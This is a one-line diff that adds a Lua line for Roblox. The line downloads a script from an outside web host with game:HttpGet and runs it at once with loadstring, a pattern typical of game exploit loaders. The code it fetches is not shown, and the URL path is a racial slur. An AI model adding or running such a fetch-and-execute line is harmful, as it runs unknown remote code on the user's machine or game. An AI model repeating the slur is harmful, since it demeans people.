@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://mattlawz.dev/negro",true))()
